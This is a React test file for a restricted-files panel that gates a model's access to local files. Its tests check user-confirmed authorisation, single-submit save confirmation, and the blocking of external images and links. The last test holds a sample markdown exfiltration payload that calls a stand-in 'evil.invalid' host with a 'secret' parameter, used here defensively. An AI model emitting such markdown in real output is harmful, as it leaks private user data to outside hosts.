import {
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
} from "@testing-library/react";
import { afterEach, expect, test, vi } from "vitest";
import { RestrictedFilesPanel } from "./RestrictedFilesPanel";
import { RestrictedFileContext, type FileSession } from "@/lib/restrictedFiles";
import { Markdown } from "./common";

const api = vi.hoisted(() => vi.fn());
const invoke = vi.hoisted(() => vi.fn());
vi.mock("@/lib/api", () => ({ api, fetchApi: vi.fn() }));
vi.mock("@tauri-apps/api/core", () => ({ invoke, isTauri: () => true }));
vi.mock("./OfficeFiles", () => ({
  FileCard: () => <span>产物预览</span>,
  DownloadResultDialog: () => null,
}));
afterEach(() => {
  cleanup();
  vi.clearAllMocks();
});

const session: FileSession = {
  id: "session",
  conversation_id: "chat",
  status: "pending",
  expires_at: "",
  grants: [],
  model_binding: {},
  read_count: 0,
  read_bytes: 0,
  events: [],
  saves: [],
};
function panel() {
  return render(
    <RestrictedFilesPanel
      conversationId="chat"
      modelSelection={{
        provider_id: "custom",
        model_name: "model",
        thinking_enabled: false,
      }}
      modelLabel="测试模型"
      modelUrl="https://model.example/v1"
      running={false}
    />,
  );
}

test("selecting a path does not grant access until the user confirms", async () => {
  api.mockResolvedValue(session);
  invoke.mockResolvedValue(["C:\\Reports\\notes.txt"]);
  panel();
  fireEvent.click(screen.getByRole("button", { name: "选择文件" }));
  await screen.findByText("C:\\Reports\\notes.txt");
  expect(api.mock.calls.some(([path]) => path.endsWith("/authorize"))).toBe(
    false,
  );
  fireEvent.click(screen.getByRole("button", { name: "确认授权给当前模型" }));
  await waitFor(() =>
    expect(api).toHaveBeenCalledWith("/file-sessions/chat/authorize", "POST", {
      paths: ["C:\\Reports\\notes.txt"],
      recursive: false,
      model_selection: {
        provider_id: "custom",
        model_name: "model",
        thinking_enabled: false,
      },
    }),
  );
});

test("save confirmation binds the displayed target and digest and cannot double-submit", async () => {
  const request = {
    id: "save",
    artifact_id: "artifact",
    name: "report.txt",
    digest: "a".repeat(64),
    size: 20,
    target: "C:\\Reports\\report.txt",
    status: "ready",
    expires_at: "2099-01-01",
    error: "",
  };
  api.mockImplementation((path: string) =>
    path.endsWith("/confirm")
      ? new Promise(() => {})
      : Promise.resolve({ ...session, status: "active", saves: [request] }),
  );
  panel();
  const button = await screen.findByRole("button", { name: "确认新建文件" });
  fireEvent.click(button);
  fireEvent.click(button);
  expect(
    api.mock.calls.filter(([path]) => path.endsWith("/confirm")),
  ).toHaveLength(1);
  expect(api).toHaveBeenCalledWith("/file-save-requests/save/confirm", "POST", {
    target: request.target,
    digest: request.digest,
  });
});

test("restricted markdown never creates an external image or clickable link", () => {
  const { container } = render(
    <RestrictedFileContext.Provider value="chat">
      <Markdown runId="run">
        {
          "![private](https://evil.invalid/leak.png) [send](https://evil.invalid/?secret=abc)"
        }
      </Markdown>
    </RestrictedFileContext.Provider>,
  );
  expect(container.querySelector("img")).toBeNull();
  expect(container.querySelector("a")).toBeNull();
  expect(screen.getByText(/外部图片已阻止/)).toBeTruthy();
});
